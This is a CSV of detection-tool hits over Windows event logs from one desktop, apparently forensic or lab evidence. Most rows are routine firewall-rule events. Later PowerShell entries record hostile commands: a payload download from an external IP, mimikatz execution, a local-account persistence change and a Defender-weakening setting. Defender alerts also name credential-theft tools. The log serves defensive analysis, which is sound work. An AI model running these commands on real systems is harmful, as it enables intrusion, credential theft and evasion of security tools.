timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data,
2024-02-28T05:05:42.877072+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,751,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 2
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 1
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 7
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{59BF09FC-7577-4DE5-A32A-8650E19C00E6}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 0
ServiceName: ''
",
2024-02-28T05:05:42.878034+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,752,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 1
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 3
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 6
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{9E62D768-B892-4636-8021-66B72D4377CD}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 1
ServiceName: ''
",
2024-02-28T05:05:42.879161+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,753,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 2
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 3
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 6
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{3ACFFA41-09AE-4F90-BCCF-E6AEF8E313E7}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 1
ServiceName: ''
",
2024-02-28T05:05:42.880254+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,754,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 1
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 1
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 7
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{9A2EF20F-A374-4586-87D4-24A289CFACB7}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 0
ServiceName: ''
",
2024-02-28T05:05:42.881217+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,755,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 2
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 1
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 7
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{793242E4-BB6F-4B76-B521-825803D7A111}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 0
ServiceName: ''
",
2024-02-28T05:05:42.882655+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,756,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 2
EdgeTraversal: 0
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 1
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 7
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{B8B0763D-40D2-4B85-BCBF-2EB8626763C1}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 0
ServiceName: ''
",
2024-02-28T05:05:42.883852+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,757,DESKTOP-A1L0P1U,"Action: 3
Active: 1
ApplicationPath: ''
Direction: 1
EdgeTraversal: 1
EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
Flags: 9
LocalAddresses: '*'
LocalOnlyMapped: 0
LocalPorts: ''
LooseSourceMapped: 0
ModifyingApplication: C:\Windows\System32\svchost.exe
ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
Origin: 1
Profiles: 7
Protocol: 256
RemoteAddresses: '*'
RemoteMachineAuthorizationList: ''
RemotePorts: ''
RemoteUserAuthorizationList: ''
RuleId: '{F5DE8750-D3EA-4105-B373-2876E15FD69B}'
RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
RuleStatus: 65536
SchemaVersion: 542
SecurityOptions: 0
ServiceName: ''
",
2024-02-28T09:20:47.860805+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,22249,DESKTOP-A1L0P1U,"CommandLine: C:\Users\TOMMYX~1\AppData\Local\Temp\F6F9D7CF-8182-4586-907D-213BBD4436BC\dismhost.exe {2F341D33-4983-4365-AACC-C908F9B03FFF}
MandatoryLabel: S-1-16-12288
NewProcessId: '0x1184'
NewProcessName: C:\Users\TOMMYX~1\AppData\Local\Temp\F6F9D7CF-8182-4586-907D-213BBD4436BC\DismHost.exe
ParentProcessName: C:\Windows\System32\cleanmgr.exe
ProcessId: '0x814'
SubjectDomainName: DESKTOP-A1L0P1U
SubjectLogonId: '0x484c8'
SubjectUserName: tommyxiaomi
SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
TargetDomainName: '-'
TargetLogonId: '0x0'
TargetUserName: '-'
TargetUserSid: S-1-0-0
TokenElevationType: '%%1937'
",
2024-03-05T12:38:51.253218+00:00,Powershell LocalAccount Manipulation,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,101,DESKTOP-A1L0P1U,"MessageNumber: 1
MessageTotal: 1
Path: ''
ScriptBlockId: e6516c78-dc94-4088-a8d9-052b913fd3e0
ScriptBlockText: Set-LocalUser -Name Guess -PasswordNeverExpires $true
",
2024-03-05T12:39:32.799578+00:00,Usage Of Web Request Commands And Cmdlets - ScriptBlock,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,128,DESKTOP-A1L0P1U,"MessageNumber: 1
MessageTotal: 1
Path: ''
ScriptBlockId: 12e16f4b-0c2e-4831-9594-56347efd339f
ScriptBlockText: Invoke-WebRequest -URI ""http://13.53.200.146/intel.zip"" -OutFile ""./intel.zip""
",
2024-03-05T12:42:06.298207+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,188,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '34'
Category Name: Tool
Detection ID: '{A359BA71-65A5-4032-A845-95D86D1965CE}'
Detection Time: 2024-03-05T12:42:05.984Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/LaZagne&threatid=2147725068&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: Unknown
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '4'
Severity Name: High
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147725068'
Threat Name: HackTool:Win32/LaZagne
Type ID: '0'
Type Name: Concrete
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:07.033711+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,190,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '8'
Category Name: Trojan
Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
Detection Time: 2024-03-05T12:42:06.432Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: Unknown
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '5'
Severity Name: Severe
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147725859'
Threat Name: Trojan:Win32/CryptInject
Type ID: '8'
Type Name: FastPath
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:07.092067+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,191,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '34'
Category Name: Tool
Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
Detection Time: 2024-03-05T12:42:06.466Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: Unknown
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '4'
Severity Name: High
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147894093'
Threat Name: HackTool:Win32/Mimikatz!pz
Type ID: '0'
Type Name: Concrete
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:12.788056+00:00,Malicious PowerShell Keywords,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,144,DESKTOP-A1L0P1U,"MessageNumber: 1
MessageTotal: 1
Path: ''
ScriptBlockId: bf21c97d-e024-460e-832b-c0d0f837180d
ScriptBlockText: ./mimikatz.exe
",
2024-03-05T12:42:12.855624+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,192,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '34'
Category Name: Tool
Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
Detection Time: 2024-03-05T12:42:06.466Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '4'
Severity Name: High
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147894093'
Threat Name: HackTool:Win32/Mimikatz!pz
Type ID: '0'
Type Name: Concrete
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:19.392542+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,193,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '8'
Category Name: Trojan
Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
Detection Time: 2024-03-05T12:42:06.432Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '5'
Severity Name: Severe
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147725859'
Threat Name: Trojan:Win32/CryptInject
Type ID: '8'
Type Name: FastPath
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:39.988504+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,194,DESKTOP-A1L0P1U,"Action ID: '2'
Action Name: Quarantine
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '34'
Category Name: Tool
Detection ID: '{A359BA71-65A5-4032-A845-95D86D1965CE}'
Detection Time: 2024-03-05T12:42:05.984Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/LaZagne&threatid=2147725068&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: Unknown
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: NT AUTHORITY\SYSTEM
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '4'
Severity Name: High
Source ID: '3'
Source Name: Real-Time Protection
State: '2'
Status Code: '3'
Status Description: ''
Threat ID: '2147725068'
Threat Name: HackTool:Win32/LaZagne
Type ID: '0'
Type Name: Concrete
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:54.330943+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,195,DESKTOP-A1L0P1U,"Action ID: '2'
Action Name: Quarantine
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '34'
Category Name: Tool
Detection ID: '{21580CAE-3CC6-46E8-8971-90FA03853D59}'
Detection Time: 2024-03-05T12:42:06.466Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz!pz&threatid=2147894093&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\mimikatz.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: NT AUTHORITY\SYSTEM
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '4'
Severity Name: High
Source ID: '3'
Source Name: Real-Time Protection
State: '2'
Status Code: '3'
Status Description: ''
Threat ID: '2147894093'
Threat Name: HackTool:Win32/Mimikatz!pz
Type ID: '0'
Type Name: Concrete
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:42:54.334282+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,196,DESKTOP-A1L0P1U,"Action ID: '2'
Action Name: Quarantine
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '8'
Category Name: Trojan
Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
Detection Time: 2024-03-05T12:42:06.432Z
Detection User: ''
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: NT AUTHORITY\SYSTEM
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '5'
Severity Name: Severe
Source ID: '3'
Source Name: Real-Time Protection
State: '2'
Status Code: '3'
Status Description: ''
Threat ID: '2147725859'
Threat Name: Trojan:Win32/CryptInject
Type ID: '8'
Type Name: FastPath
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:44:04.124895+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,199,DESKTOP-A1L0P1U,"Action ID: '9'
Action Name: Not Applicable
Additional Actions ID: '0'
Additional Actions String: No additional actions required
Category ID: '8'
Category Name: Trojan
Detection ID: '{67BED77B-4FEF-462A-BC3B-77384FD3CDE9}'
Detection Time: 2024-03-05T12:44:02.022Z
Detection User: DESKTOP-A1L0P1U\tommyxiaomi
Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
Error Code: '0x00000000'
Error Description: 'The operation completed successfully. '
Execution ID: '1'
Execution Name: Suspended
FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.B!ml&threatid=2147735505&enterprise=0
Origin ID: '1'
Origin Name: Local machine
Path: file:_C:\Users\tommyxiaomi\Documents\intel.exe
Post Clean Status: '0'
Pre Execution Status: '0'
Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Product Name: Microsoft Defender Antivirus
Product Version: 4.18.24010.12
Remediation User: ''
Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
Severity ID: '5'
Severity Name: Severe
Source ID: '3'
Source Name: Real-Time Protection
State: '1'
Status Code: '1'
Status Description: ''
Threat ID: '2147735505'
Threat Name: Trojan:Win32/Wacatac.B!ml
Type ID: '8'
Type Name: FastPath
Unused: ''
Unused2: ''
Unused3: ''
Unused4: ''
Unused5: ''
Unused6: ''
",
2024-03-05T12:44:35.475593+00:00,Tamper Windows Defender - ScriptBlockLogging,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,235,DESKTOP-A1L0P1U,"MessageNumber: 1
MessageTotal: 1
Path: ''
ScriptBlockId: dc36385f-6aac-40d8-a393-7c086af54232
ScriptBlockText: Set-MpPreference -MAPSReporting 0ΓÇï
",
